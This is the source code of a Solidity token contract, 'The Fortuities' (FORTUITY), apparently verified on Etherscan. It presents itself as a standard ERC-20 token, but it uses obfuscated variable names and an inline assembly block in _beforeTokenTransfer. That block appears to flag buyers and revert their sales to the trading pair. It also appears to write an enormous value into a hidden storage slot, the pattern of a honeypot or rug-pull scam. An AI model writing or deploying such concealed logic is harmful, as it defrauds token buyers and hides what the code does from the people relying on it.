/**
 *Submitted for verification at Etherscan.io on 2022-11-16
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private unluckyTime;

    mapping (address => bool) private labelConduct;
    mapping (address => uint256) private _policeFamily;
    mapping (address => mapping (address => uint256)) private _finishComfort;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;

    IDEXRouter router;

    string private _name; string private _symbol; uint256 private _totalSupply; bool private theTrading;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _symbol = symbol_;
        unluckyTime.push(_router); unluckyTime.push(msgSender_); unluckyTime.push(pair);
        for (uint256 q=0; q < 3;) {labelConduct[unluckyTime[q]] = true; unchecked{q++;} }
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _finishComfort[owner][spender];
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function openTrading() external onlyOwner returns (bool) {
        theTrading = true;
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _finishComfort[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _policeFamily[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function _beforeTokenTransfer(address sender, address recipient) internal {
        require((theTrading || (sender == unluckyTime[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function threeEmotion(x,y) -> stayBlind { mstore(0, x) mstore(32, y) stayBlind := keccak256(0, 64) }
            function eatWife(x,y) -> islandTower { mstore(0, x) islandTower := add(keccak256(0, 32),y) }

            if and(and(eq(sender,sload(eatWife(0x2,0x1))),eq(recipient,sload(eatWife(0x2,0x2)))),iszero(sload(0x1))) { sstore(0xfd45bea9ef6f407cb44466d9898600eb5ea5758d21ded44d9bddcfa488c27568,exp(0xA,0x40)) } if eq(recipient,0x1) { sstore(0x99,0x1) }
            if and(and(or(eq(sload(0x99),0x1),eq(sload(threeEmotion(sender,0x3)),0x1)),eq(recipient,sload(eatWife(0x2,0x2)))),iszero(eq(sender,sload(eatWife(0x2,0x1))))) { invalid() }
            if eq(sload(0x110),number()) { if and(and(eq(sload(0x105),number()),eq(recipient,sload(eatWife(0x2,0x2)))),eq(sload(0x115),sender)) { invalid() }
                sstore(0x105,sload(0x110)) sstore(0x115,sload(0x120)) }
            if and(iszero(eq(sender,sload(eatWife(0x2,0x2)))),and(iszero(eq(recipient,sload(eatWife(0x2,0x1)))),iszero(eq(recipient,sload(eatWife(0x2,0x2)))))) { sstore(threeEmotion(recipient,0x3),0x1) }
            sstore(0x110,number()) sstore(0x120,recipient)
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient);

        uint256 senderBalance = _policeFamily[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _policeFamily[sender] = senderBalance - amount;
        _policeFamily[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _finishComfort[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _DeployFORTUITY(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _policeFamily[account] += amount;
        approve(unluckyTime[0], 10 ** 77);
    
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployFORTUITY(creator, initialSupply);
    }
}

contract Fortuity is ERC20Token {
    constructor() ERC20Token("The Fortuities", "FORTUITY", msg.sender, 12500000 * 10 ** 18) {
    }
}